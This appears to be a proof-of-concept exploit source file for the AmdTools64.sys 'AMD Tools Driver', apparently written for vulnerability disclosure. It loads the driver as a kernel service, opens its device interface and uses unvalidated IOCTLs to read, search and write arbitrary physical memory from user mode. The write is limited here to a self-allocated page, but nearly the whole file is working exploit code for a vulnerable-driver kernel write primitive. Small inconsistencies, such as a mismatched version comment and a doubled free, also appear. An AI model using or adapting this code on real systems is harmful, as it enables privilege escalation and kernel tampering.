// PoC: AmdTools64.sys ("AMD Tools Driver" 1.7.16.219) arbitrary PHYSICAL
// MEMORY WRITE from user mode via IOCTL 0xFFF02820.
//
// Companion to poc_amdtools64.cpp (which demonstrates mapping/read via
// IOCTL 0xFFF028A4). This one exercises the driver's copy-in write handler:
//
//   handler 0x140003050:
//     1. MmMapIoSpace(req.PhysicalAddress, req.Width, MmCached)   // unvalidated
//     2. memcpy from req.Data[0..Width) into the mapped region    // Width = 1..0x100
//     3. MmUnmapIoSpace
//
// Build (MinGW-w64, x64):
//   x86_64-w64-mingw32-g++ -O2 -municode -static -o poc_amdtools64_write.exe \
//       poc_amdtools64_write.cpp -lcfgmgr32
// or (MSVC, x64):
//   cl /EHsc /W4 poc_amdtools64_write.cpp cfgmgr32.lib
//
// Run (elevated prompt):
//   poc_amdtools64_write.exe C:\absolute\path\to\AmdTools64.sys
//
// Safety: the PoC never writes to memory it does not own. It allocates a
// private page, plants a unique 32-byte nonce at its start, locates the
// page's physical address with the driver's own pattern-search/read IOCTL
// (0xFFF02824), writes the payload into that exact physical page with
// IOCTL 0xFFF02820 and verifies the bytes landed in the process' own
// user-mode virtual address. Verification is cross-checked with the
// driver's block-read IOCTL 0xFFF0281C.

#include <windows.h>
#include <psapi.h>
#include <newdev.h>
#include <cfgmgr32.h>
#include <initguid.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <string>

#pragma comment(lib, "cfgmgr32.lib")
#pragma comment(lib, "newdev.lib")

DEFINE_GUID(
    GUID_AMD_INTERFACE,
    0x1232175B,
    0x1C34,
    0x41FD,
    0xB1,
    0x01,
    0x34,
    0x2D,
    0x47,
    0xB8,
    0x28,
    0xAC
);

#define IOCTL_GET_VERSION   0xFFF02800u // out DWORD 0x010710DA
#define IOCTL_PHYS_READ     0xFFF0281Cu // PhysBlockRequest: read  Width bytes
#define IOCTL_PHYS_WRITE    0xFFF02820u // PhysBlockRequest: write Width bytes
#define IOCTL_PHYS_FINDREAD 0xFFF02824u // FindRequest: scan phys memory for pattern

// NOTE: the driver validates InputBufferLength/OutputBufferLength against
// per-IOCTL minimums, so every request is sent with a fixed 0x2122-byte
// buffer (the largest requirement) regardless of the actual request size.
#define IOCTL_BUF_SIZE 0x2122

// Shared layout for IOCTL 0xFFF0281C (read) and 0xFFF02820 (write).
#pragma pack(push, 1)
struct PhysBlockRequest
{
    UINT64 PhysicalAddress; // +0x000 in: 64-bit physical address (unvalidated)
    UINT16 Width;           // +0x008 in: byte count, 1..0x100
    UINT16 Status;          // +0x00A out: 0 = ok, 5 = MmMapIoSpace failed, 6 = bad width
    UINT8  Data[0x100];     // +0x00C in (write) / out (read)
};

// IOCTL 0xFFF02824: scan [Base, Base+WindowSize) with MmMapIoSpace + RtlCompareMemory,
// then read up to ReadLength bytes from the match into Data.
struct FindRequest
{
    UINT64 Base;            // +0x000 in:  scan base (must be nonzero - MmMapIoSpace(0,..) fails)
    UINT64 FoundAddress;    // +0x008 out: physical address of the match
    UINT32 WindowSize;      // +0x010 in:  window size (also the MmMapIoSpace length)
    UINT32 Stride;          // +0x014 in:  probe step inside the window
    UINT32 PatternLength;   // +0x018 in:  pattern length, 1..0x100
    UINT32 ReadLength;      // +0x01C in:  read-back length on match, <= 0x2000
    UINT16 Status;          // +0x020 out: 0 = found, 3 = not found,
                            //             5 = MmMapIoSpace failed, 6 = bad params
    UINT8  Pattern[0x100];  // +0x022 in
    UINT8  Data[0x2000];    // +0x122 out: read-back from FoundAddress
};
#pragma pack(pop)

static HANDLE OpenDevice()
{
    // The driver enables its device interface from StartDevice, which can
    // complete shortly after CM_Setup_DevNode returns - poll for it.
    for (int attempt = 0; attempt < 40; ++attempt)
    {
        ULONG bufferSize = 0;
        CONFIGRET cr = CM_Get_Device_Interface_List_SizeW(
            &bufferSize, (LPGUID)&GUID_AMD_INTERFACE, nullptr,
            CM_GET_DEVICE_INTERFACE_LIST_PRESENT);
        if (cr == CR_SUCCESS && bufferSize > 1)
        {
            static wchar_t path[MAX_PATH * 2];
            cr = CM_Get_Device_Interface_ListW(
                (LPGUID)&GUID_AMD_INTERFACE, nullptr, path, bufferSize,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT);
            if (cr == CR_SUCCESS)
            {
                printf("[+] device interface: %ls\n", path);
                HANDLE h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                                       nullptr, OPEN_EXISTING,
                                       FILE_ATTRIBUTE_NORMAL, nullptr);
                if (h == INVALID_HANDLE_VALUE)
                    printf("[-] CreateFileW failed: %lu\n", GetLastError());
                return h;
            }
        }
        Sleep(250);
    }
    printf("[-] device interface did not appear within 10 s\n");
    return INVALID_HANDLE_VALUE;
}

static BOOL CallIoctl(HANDLE hDevice, UINT code, void* buf)
{
    DWORD bytesReturned = 0;
    return DeviceIoControl(hDevice, code, buf, IOCTL_BUF_SIZE, buf,
                           IOCTL_BUF_SIZE, &bytesReturned, nullptr);
}

static BOOL PhysRead(HANDLE h, UINT64 phys, UINT16 width, UINT8* out)
{
    static UINT8 buf[IOCTL_BUF_SIZE];
    memset(buf, 0, sizeof(buf));
    PhysBlockRequest* r = (PhysBlockRequest*)buf;
    r->PhysicalAddress = phys;
    r->Width = width;
    if (!CallIoctl(h, IOCTL_PHYS_READ, buf) || r->Status != 0)
        return FALSE;
    memcpy(out, r->Data, width);
    return TRUE;
}

static BOOL PhysWrite(HANDLE h, UINT64 phys, UINT16 width, const UINT8* inData)
{
    static UINT8 buf[IOCTL_BUF_SIZE];
    memset(buf, 0, sizeof(buf));
    PhysBlockRequest* r = (PhysBlockRequest*)buf;
    r->PhysicalAddress = phys;
    r->Width = width;
    memcpy(r->Data, inData, width);
    return CallIoctl(h, IOCTL_PHYS_WRITE, buf) && r->Status == 0;
}

// --- AWE: allocate a physical page owned by this process ----------------
// Requires SeLockMemoryPrivilege ("Lock pages in memory"). The returned
// page frame number is exact, so the write target is a frame we own and the
// demonstration cannot damage unrelated kernel/device memory.

static BOOL EnableLockMemoryPrivilege()
{
    HANDLE tok = INVALID_HANDLE_VALUE;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    TOKEN_PRIVILEGES tp{};
    if (!LookupPrivilegeValueW(nullptr, L"SeLockMemoryPrivilege", &tp.Privileges[0].Luid))
    {
        CloseHandle(tok);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, 0, nullptr, nullptr) &&
              GetLastError() == ERROR_SUCCESS;
    CloseHandle(tok);
    return ok;
}

// Write a minimal INF next to the driver so PnP can bind the devnode to the
// AmdTools64 service (Windows 1607+ refuses INF-less root devnodes).
static BOOL WriteInfFile(const wchar_t* infPath, const wchar_t* sysPath)
{
    char inf[2048];
    char sysA[MAX_PATH * 2];
    WideCharToMultiByte(CP_ACP, 0, sysPath, -1, sysA, sizeof(sysA), nullptr, nullptr);

    int n = snprintf(inf, sizeof(inf),
        "[Version]\r\n"
        "Signature=\"$WINDOWS NT$\"\r\n"
        "Class=System\r\n"
        "ClassGuid={4D36E97D-E325-11CE-BFC1-08002BE10318}\r\n"
        "Provider=%%AMD%%\r\n"
        "DriverVer=09/16/2026,1.7.16.219\r\n"
        "\r\n"
        "[Manufacturer]\r\n"
        "%%AMD%%=AMD,NTamd64\r\n"
        "\r\n"
        "[AMD.NTamd64]\r\n"
        "%%DevDesc%%=AmdTools64.Install,Root\\AmdTools64\r\n"
        "\r\n"
        "[AmdTools64.Install]\r\n"
        "\r\n"
        "[AmdTools64.Install.Services]\r\n"
        "AddService=AmdTools64,0x00000002,AmdTools64.Service\r\n"
        "\r\n"
        "[AmdTools64.Service]\r\n"
        "ServiceType=1\r\n"
        "StartType=3\r\n"
        "ErrorControl=1\r\n"
        "ServiceBinary=%s\r\n"
        "\r\n"
        "[Strings]\r\n"
        "AMD=\"AMD\"\r\n"
        "DevDesc=\"AMD Tools Driver\"\r\n",
        sysA);

    HANDLE f = CreateFileW(infPath, GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW(inf) failed: %lu\n", GetLastError());
        return FALSE;
    }
    DWORD written = 0;
    BOOL ok = WriteFile(f, inf, (DWORD)n, &written, nullptr);
    CloseHandle(f);
    if (!ok)
        printf("[-] WriteFile(inf) failed: %lu\n", GetLastError());
    return ok;
}

static BOOL InstallDriver(const wchar_t* driverPath)
{
    const std::wstring serviceName = L"AmdTools64";

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        printf("[-] OpenSCManagerW failed: %lu (need elevation)\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCM, serviceName.c_str(), serviceName.c_str(), SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        driverPath, nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!hService)
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
        {
            printf("[=] service already exists, reusing\n");
            hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        }
        else
        {
            printf("[-] CreateServiceW failed: %lu\n", err);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }
    else
    {
        printf("[+] kernel service created\n");
    }

    // The driver is PnP: create a root-enumerated devnode bound to the
    // service so AddDevice() runs and the device interface appears.
    DEVINST devParent = 0;
    if (CM_Locate_DevNodeW(&devParent, nullptr, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS)
    {
        printf("[-] CM_Locate_DevNodeW failed\n");
        return FALSE;
    }

    DEVINST devInst = 0;
    const wchar_t deviceID[] = L"Root\\AmdTools64\\0000";
    CONFIGRET cr = CM_Create_DevNodeW(&devInst, const_cast<DEVINSTID_W>(deviceID),
                                      devParent, CM_CREATE_DEVNODE_NORMAL);
    if (cr != CR_SUCCESS)
    {
        // Already exists from an earlier run - look it up instead.
        cr = CM_Locate_DevNodeW(&devInst, const_cast<DEVINSTID_W>(deviceID),
                                CM_LOCATE_DEVNODE_NORMAL);
        printf("[=] devnode %s (cr=0x%08X)\n",
               cr == CR_SUCCESS ? "located" : "locate failed", cr);
        if (cr != CR_SUCCESS)
            return FALSE;
    }
    else
    {
        printf("[=] devnode created\n");
    }

    // Bind the function driver via a minimal INF (devcon-style install).
    wchar_t infPath[MAX_PATH * 2];
    lstrcpyW(infPath, driverPath);
    lstrcpyW(infPath + lstrlenW(infPath) - 4, L".inf");

    if (!WriteInfFile(infPath, driverPath))
        return FALSE;

    BOOL reboot = FALSE;
    if (!UpdateDriverForPlugAndPlayDevicesW(nullptr, L"Root\\AmdTools64",
                                            infPath, INSTALLFLAG_FORCE,
                                            &reboot))
    {
        // DriverStore staging rejects catalog-less packages even in test
        // signing mode; that is fine when the devnode is already bound
        // (e.g. via the Class/{GUID} driver-node registry method).
        printf("[!] UpdateDriverForPlugAndPlayDevices failed: %lu "
               "(continuing - devnode may already be bound)\n",
               GetLastError());
    }
    else
    {
        printf("[+] driver bound to devnode via INF%s\n",
               reboot ? " (reboot required)" : "");
    }
    return TRUE;
}

int main(int argc, char** argv)
{
    printf("[*] AmdTools64.sys arbitrary PHYSICAL WRITE PoC (IOCTL 0xFFF02820)\n");

    if (argc < 2)
    {
        printf("[-] usage: %s <absolute path to AmdTools64.sys>\n", argv[0]);
        return 1;
    }

    char driverPathA[MAX_PATH * 2] = {};
    if (!GetFullPathNameA(argv[1], MAX_PATH * 2, driverPathA, nullptr))
    {
        printf("[-] GetFullPathNameA failed: %lu\n", GetLastError());
        return 1;
    }
    wchar_t driverPath[MAX_PATH * 2] = {};
    MultiByteToWideChar(CP_UTF8, 0, driverPathA, -1, driverPath, MAX_PATH * 2);

    if (!InstallDriver(driverPath))
        return 1;

    HANDLE hDevice = OpenDevice();
    if (hDevice == INVALID_HANDLE_VALUE)
        return 1;

    // 0. Sanity: driver reports its version (0x010710DA = 1.7.16.218).
    UINT32 version = 0;
    {
        static UINT8 vbuf[IOCTL_BUF_SIZE];
        memset(vbuf, 0, sizeof(vbuf));
        if (CallIoctl(hDevice, IOCTL_GET_VERSION, vbuf))
            version = *(UINT32*)vbuf;
    }
    if (version)
        printf("[+] driver version: 0x%08X\n", version);

    // 1. Allocate one AWE page: an exact physical frame owned by us.
    if (!EnableLockMemoryPrivilege())
    {
        printf("[-] SeLockMemoryPrivilege not available "
               "(grant 'Lock pages in memory' and re-logon)\n");
        return 1;
    }
    printf("[+] SeLockMemoryPrivilege enabled\n");

    // AWE regions are allocated with 2 MB granularity; we map a single
    // 4 KiB frame into the start of the region.
    UINT8* page = (UINT8*)VirtualAlloc(nullptr, 0x200000,
                                       MEM_RESERVE | MEM_PHYSICAL,
                                       PAGE_READWRITE);
    if (!page)
    {
        printf("[-] VirtualAlloc(MEM_PHYSICAL) failed: %lu\n", GetLastError());
        return 1;
    }
    ULONG_PTR pfn = 0;
    ULONG_PTR onePage = 1;
    if (!AllocateUserPhysicalPages(GetCurrentProcess(), &onePage, &pfn) ||
        pfn == 0)
    {
        printf("[-] AllocateUserPhysicalPages failed: %lu\n", GetLastError());
        return 1;
    }
    if (!MapUserPhysicalPages(page, 1, &pfn))
    {
        printf("[-] MapUserPhysicalPages failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] AWE frame mapped: PFN 0x%llX -> physical 0x%llX\n",
           (unsigned long long)pfn, (unsigned long long)(pfn << 12));

    UINT64 physPage = (UINT64)pfn << 12;

    // 2. Plant the marker through our own VA (lands in the physical frame).
    UINT8 marker[32];
    srand(GetTickCount() ^ GetCurrentProcessId());
    for (size_t i = 0; i < sizeof(marker); ++i)
        marker[i] = (UINT8)(rand() & 0xFF);
    memset(page, 0xCC, 0x1000);
    memcpy(page, marker, sizeof(marker));
    printf("[*] marker planted via user VA %p\n", (void*)page);

    // 3. Independent check: kernel-side block read sees the same marker.
    UINT8 check[32] = {};
    if (PhysRead(hDevice, physPage, sizeof(check), check) &&
        memcmp(check, marker, sizeof(marker)) == 0)
        printf("[+] read-back via 0xFFF0281C matches the marker\n");
    else
    {
        printf("[-] 0xFFF0281C read-back mismatch - aborting\n");
        return 1;
    }

    // 4. THE WRITE: arbitrary physical memory write via 0xFFF02820.
    const char* payloadStr = "AmdTools64 0xFFF02820 phys write";
    const UINT16 payloadLen = 32; // string is exactly 32 chars
    const UINT8* payload = (const UINT8*)payloadStr;
    const UINT64 target = physPage + 0x800;
    printf("[*] writing 32 bytes via IOCTL 0xFFF02820 to physical 0x%llX...\n",
           (unsigned long long)target);

    if (!PhysWrite(hDevice, target, payloadLen, payload))
    {
        printf("[-] 0xFFF02820 write FAILED\n");
        return 1;
    }
    printf("[+] driver accepted the write (status = 0)\n");

    // 5. Verify through the process' own mapping of that physical frame.
    if (memcmp(page + 0x800, payload, payloadLen) == 0)
    {
        printf("[+] PROOF: bytes appeared in OUR user-mode page @%p:\n    ",
               (void*)(page + 0x800));
        for (int i = 0; i < payloadLen; ++i)
            printf("%c", payload[i] >= 0x20 && payload[i] < 0x7F ? payload[i] : '.');
        printf("\n");
    }
    else
    {
        printf("[-] verification failed: user VA does not contain payload\n");
        return 1;
    }

    // 6. Bonus: the DWORD path of the handler (Width == 4 -> mov dword ptr).
    const UINT32 dwordPayload = 0x44434241; // "ABCD"
    if (PhysWrite(hDevice, physPage + 0x810, 4, (const UINT8*)&dwordPayload) &&
        *(UINT32*)(page + 0x810) == dwordPayload)
        printf("[+] DWORD write path verified (0x%08X @phys 0x%llX)\n",
               dwordPayload, (unsigned long long)(physPage + 0x810));

    // 7. Zero out the scratch area so the page is back to a known state.
    memset(page + 0x800, 0, 0x100);

    CloseHandle(hDevice);

    MapUserPhysicalPages(page, 0, nullptr);          // unmap
    onePage = 1;
    FreeUserPhysicalPages(GetCurrentProcess(), &onePage, &pfn);
    VirtualFree(page, 0, MEM_RELEASE);

    SERVICE_STATUS ss = {};
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (hSCM)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, L"AmdTools64", SERVICE_ALL_ACCESS);
        if (hService)
        {
            ControlService(hService, SERVICE_CONTROL_STOP, &ss);
            DeleteService(hService);
            CloseServiceHandle(hService);
            printf("[+] service stopped and deleted (devnode under"
                   " Root\\AmdTools64 may remain in Device Manager)\n");
        }
        CloseServiceHandle(hSCM);
    }
    VirtualFree(page, 0, MEM_RELEASE);
    printf("[*] done\n");
    return 0;
}
